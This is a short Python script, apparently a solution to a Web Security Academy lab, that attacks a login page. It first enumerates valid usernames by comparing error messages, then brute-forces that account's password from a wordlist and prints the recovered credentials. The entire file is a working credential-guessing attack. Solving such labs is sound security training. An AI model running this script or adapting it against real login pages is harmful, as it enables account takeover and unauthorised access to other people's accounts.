import requests

url = "https://0a8200bb03d2b0ff80461280001d001d.web-security-academy.net/login"

username = ""

with open("usernames.txt", "r") as f:
    for line in f:
        data = {
            "username" : line.strip(),
            "password" : "test"
        }
        response = requests.post(url, data)
        if(not b"Invalid" in response.content):
            print(f"Valid username : {line}")
            username = line

with open("passwords.txt", "r") as f:
    for line in f:
        data = {
            "username" : username.strip(),
            "password" : line.strip()
        }
        response = requests.post(url, data)
        if(not b"Incorrect" in response.content):
            print(f"Passowrd for {username.strip()} : {line.strip()}")
            password = line

print(f"Creds ==> username : {username.strip()} || password : {password.strip()}")